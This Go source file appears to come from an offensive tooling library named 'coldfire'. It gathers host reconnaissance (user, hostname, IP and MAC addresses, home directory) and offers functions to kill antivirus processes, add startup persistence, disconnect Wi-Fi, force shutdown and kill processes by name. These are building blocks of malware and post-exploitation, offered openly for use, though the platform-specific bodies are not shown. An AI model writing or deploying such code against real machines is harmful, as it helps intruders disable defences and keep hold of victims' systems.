package coldfire

import (
	"errors"
	"fmt"
	"io/fs"
	"log"
	"os"
	"os/user"
	"strings"
	"time"

	"github.com/beevik/ntp"
	"github.com/matishsiao/goInfo"
	"github.com/mitchellh/go-homedir"
	ps "github.com/mitchellh/go-ps"
)

// Info is used to return basic system information.
// Note that if information can not be resolved in a
// specific field it returns "N/A"
func Info() map[string]string {
	_, mac := Iface()
	var (
		u     string
		ap_ip string
	)

	i, _ := goInfo.GetInfo()

	u = userinfo()
	ap_ip = ""
	_ = ap_ip
	hdir, err := homedir.Dir()
	if err != nil {
		log.Fatalf(err.Error())
	}

	inf := map[string]string{
		"username":  u,
		"hostname":  fmt.Sprintf("%v", i.Hostname),
		"go_os":     fmt.Sprintf("%v", i.GoOS),
		"os":        fmt.Sprintf("%v", i.OS),
		"platform":  fmt.Sprintf("%v", i.Platform),
		"cpu_num":   fmt.Sprintf("%v", i.CPUs),
		"kernel":    fmt.Sprintf("%v", i.Kernel),
		"core":      fmt.Sprintf("%v", i.Core),
		"local_ip":  GetLocalIP(),
		"global_ip": GetGlobalIP(),
		"ap_ip":     GetGatewayIP(),
		"mac":       mac,
		"homedir":   hdir,
	}

	return inf
}

// Obtains current time from NTP server
func TimeNTP() time.Time {
	ntp_time, err := ntp.Time("time.ntp.com")
	if err != nil {
		ntp_time, _ = ntp.Time("time.apple.com")
	}
	return ntp_time
}

// PkillPid kills a process by its PID.
func PkillPid(pid int) error {
	err := KillProcByPID(pid)
	return err
}

// KillProcByPID kills a process given its PID.
func KillProcByPID(pid int) error {
	return killProcByPID(pid)
}

// PkillName kills a process by its name.
func PkillName(name string) error {
	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if strings.Contains(proc_name, name) {
			err := KillProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// PkillAv kills Anti-Virus processes that may run within the machine.
func PkillAv() error {
	return pkillAv()
}

// Processes returns a map of a PID to its respective process name.
func Processes() (map[int]string, error) {
	prs := make(map[int]string)
	processList, err := ps.Processes()
	if err != nil {
		return nil, err
	}

	for x := range processList {
		process := processList[x]
		prs[process.Pid()] = process.Executable()
	}

	return prs, nil
}

// Users returns a list of known users within the machine.
func Users() ([]string, error) {
	return users()
}

// WifiDisconnect is used to disconnect the machine from a wireless network.
func WifiDisconnect() error {
	return wifiDisconnect()
}

// Disks returns a list of storage drives within the machine.
func Disks() ([]string, error) {
	return disks()
}

// TraverseCurrentDir lists all files that exist within the current directory.
func TraverseCurrentDir() ([]string, error) {
	files_in_dir := []string{}
	files, err := os.ReadDir(".")
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		files_in_dir = append(files_in_dir, f.Name())
	}

	return files_in_dir, nil
}

// TraverseDir lists all files that exist within a given directory.
func TraverseDir(dir string) ([]string, error) {
	files_in_dir := []string{}
	files, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		files_in_dir = append(files_in_dir, f.Name())
	}

	return files_in_dir, nil
}

// FilePermissions checks if a given file has read and write permissions.
func FilePermissions(filename string) (bool, bool) {
	write_permission := true
	read_permission := true

	file, err := os.OpenFile(filename, os.O_WRONLY, 0666)
	if err != nil {
		if os.IsPermission(err) {
			write_permission = false
		}
	}
	file.Close()

	return read_permission, write_permission
}

// Exists checks if a given file is in the system.
func Exists(file string) bool {
	_, err := os.Stat(file)
	if err != nil {
		if errors.Is(err, fs.ErrNotExist) {
			return false
		}
	}
	return true
}

// IsRoot checks if the current user is the administrator of the machine.
func IsRoot() bool {
	return isRoot()
}

// Shutdown forces the machine to shutdown.
func Shutdown() error {
	return shutdown()
}

// AddPersistentCommand creates a task that runs a given command on startup.
func AddPersistentCommand(cmd string) error {
	return addPersistentCommand(cmd)
}

func GetUser() (string, error) {
	current_user, err := user.Current()
	return current_user.Username, err
}
